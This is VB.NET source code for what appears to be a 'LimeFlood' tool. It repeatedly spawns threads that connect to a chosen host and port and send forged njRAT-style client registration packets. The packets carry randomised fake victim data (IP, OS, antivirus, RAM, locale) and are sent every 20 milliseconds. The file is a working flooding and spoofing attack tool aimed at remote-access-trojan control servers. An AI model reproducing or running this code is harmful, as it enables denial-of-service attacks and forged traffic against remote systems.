Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class REV
    Public C As TcpClient
    Public SPL As String = "*-]NK[-*"
    Public ID As String = "TGltZUZsb29k"
    Public HOST As String = Nothing
    Public PORT As Integer = Nothing
    Public KEY As String = Nothing
    Public F As Form1

    Public Sub Start(ByVal H As String, P As Integer, ByVal K As String)
        HOST = H
        PORT = P
        Key = K
        Dim T As Thread = New Thread(New ThreadStart(AddressOf Attack))
        T.IsBackground = True
        T.Start()
    End Sub

    Public Sub Attack()
        While F.AttackStop = False
            Dim T As Thread = New Thread(New ThreadStart(AddressOf Connect))
            T.IsBackground = True
            T.Start()
            Thread.Sleep(20)
        End While
    End Sub
    Public Sub Connect()
        Dim C As New TcpClient
        Try
            C.Connect(HOST, PORT)
            C.Client.Send(SB(("Information" & Key & ID & Key & Encode("_" & vl("ID")) & Key & vl("IP") & Key & Encode(vl("Name")) & Key & "Yes" & Key & Encode(vl("OS")) & Key & Encode(vl("MP")) & Key & vl("RAM") & Key & Encode(vl("AV")) & Key & Encode(vl("FW")) & Key & New Random().Next(333, 1000) & Key & " " & Key & Encode(vl("CultureInfo")) & Key & "False" + (SPL)))) ' RVUS for make this client special color in lv , true for spread , RVUS for you , and false mean this client didn't come from spread
        Catch ex As Exception
            '  MsgBox("Server is not Listening")
            Debug.WriteLine("Err")
        End Try
    End Sub


    Function SB(ByVal s As String) As Byte()
        Return Encoding.Default.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String
        Return Encoding.Default.GetString(b)
    End Function

    Public Function Encode(ByVal Input As String)
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input))
    End Function

    Public OS As New List(Of String)({"Windows Vista", "Windows 7", "Windows 8.1", "Windows 10"})
    Public MP As New List(Of String)({"i7-8086K", "i5-8600K", "i3-8350K"})
    Public AV As New List(Of String)({"Kaspersky Lab Internet Security", "Microsoft Windows Defender", "Avast Free Antivirus", "Avira", "None"})
    Public FW As New List(Of String)({"Windows Firewall", "ZoneAlarm", "Trend Micro Internet Security", "None"})
    Public RAM As New List(Of String)({"8565653504", "4282826752", "2141413376", "17131307008"})
    Public IP As New List(Of String)({"175.2.26.179", "155.188.150.66", "139.170.179.121", "227.117.182.131"})
    Public CultureInfo As New List(Of String)({"en-US", "th-TH", "ja-JP"})

    Private Function vl(ByVal S As String) As String
        Select Case S
            Case "ID"
                Return Encode(Path.GetRandomFileName.Substring(6).ToUpper)

            Case "IP"
                Return IP.Item(New Random().Next(0, IP.Count))

            Case "OS"
                Return OS.Item(New Random().Next(0, OS.Count))

            Case "MP"
                Return MP.Item(New Random().Next(0, MP.Count))

            Case "AV"
                Return AV.Item(New Random().Next(0, AV.Count))

            Case "FW"
                Return FW.Item(New Random().Next(0, FW.Count))

            Case "CultureInfo"
                Return CultureInfo.Item(New Random().Next(0, CultureInfo.Count))

            Case "RAM"
                Return RAM.Item(New Random().Next(0, RAM.Count))

            Case "Name"
                Return Path.GetRandomFileName.Substring(6).ToUpper.Replace(".", Nothing) + "/" + Path.GetRandomFileName.Substring(6).ToUpper.Replace(".", Nothing)
        End Select

    End Function
End Class
